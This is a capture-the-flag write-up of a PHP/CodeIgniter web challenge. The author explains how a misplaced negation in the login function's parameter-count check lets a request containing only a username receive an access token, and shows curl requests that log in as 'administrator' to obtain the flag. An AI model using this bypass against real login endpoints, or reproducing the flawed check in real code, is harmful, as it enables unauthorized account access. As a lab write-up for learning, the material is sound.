I'm greeted with a website that has multiple pages, such as =Home=, =Sign In= and
=Sign Up=. So I guess I can create an account and login. I'll start by creating account:

And now I can login:

Nothing interesting, very underwhelming! Hopefully, the downloaded files can
show us something more. Right at the start, I can see that the web application
was made using =CodeIgniter=, which uses =PHP=. The logic of each page resides in
the controllers. The =ProfileController.php= seems to be the one that has the
logic of the page that is shown after a user logs in. It is also the one that
reads the flag and prints it out! But I have to be the user called
=administrator=, and I feel it's same to assume that that user already exists.

#+BEGIN_SRC php
if ($username == "administrator") {
    return view("ProfilePage", [
      "username" => $username,
      "content" => $flag,
    ]);
}
#+END_SRC

The =UserController.php= has the logic for the login page and the =login= function
has some error handling and whatever. This is when I think it's best to get the
login request and mess around with it. If I login successfully, I get an access token:

#+BEGIN_SRC sh :results output
curl 'http://94.237.51.26:52223/index.php/login' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"AsmArtisan256","password":"XXXX"}'
#+END_SRC

#+BEGIN_SRC js
{"message":"Login Succesful","token":"XXXX"}
#+END_SRC

If I use an empty password, it tells me that the user wasn't found:

#+BEGIN_SRC sh :results output
curl 'http://94.237.51.26:52223/index.php/login' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"AsmArtisan256","password":""}'
#+END_SRC

#+BEGIN_SRC
User not found
#+END_SRC

Then I tried adding a parameter, just to test it out, but now there isn't even output:

#+BEGIN_SRC sh
curl 'http://94.237.51.26:52223/index.php/login' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"AsmArtisan256","password":"XXXX","test":"test"}'
#+END_SRC

Until I tested the scenario of just sending the username:

#+BEGIN_SRC sh
curl 'http://94.237.51.26:52223/index.php/login' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"AsmArtisan256"}'
#+END_SRC

#+BEGIN_SRC js
{"message":"Login Succesful", "token":"XXXX"}
#+END_SRC

Ok, wait a second, I just sent the username and it still gave me an access
token? I guess I can just change the username to =administrator= and get that
user's access token right? Yep.

Although I found this just by chance, what actually happened? The
=UserController.php= file has the =login= function that executes the previous
request. It starts by connecting to the database, getting the JSON body,
verifying if it has username and password and so on:

#+BEGIN_SRC php
public function login()
{
    $db = db_connect();
    $json_data = request()->getJSON(true);
    if (!count($json_data) == 2) {
        return $this->respond("Please provide username and password", 404);
    }
    $query = $db->table("users")->getWhere($json_data, 1, 0);
    $result = $query->getRowArray();

    ................
}
#+END_SRC

The =if= statement that verifies the number of parameters in the =JSON= body messed
up, for some reason, and thought that only one parameter was valid enough to
continue through the database logic. But the exclamation point before the
function call makes all the difference:

#+BEGIN_SRC php
$c[0] = 1;
var_dump(count($c));

// => int(1)

$c[0] = 1;
var_dump(!count($c));

// => bool(false)
#+END_SRC

So, according to the code above, ~false == 2~ is always a false statement,
enabling us the possibility of logging in with just the username and getting the
flag by using the resulting access token!
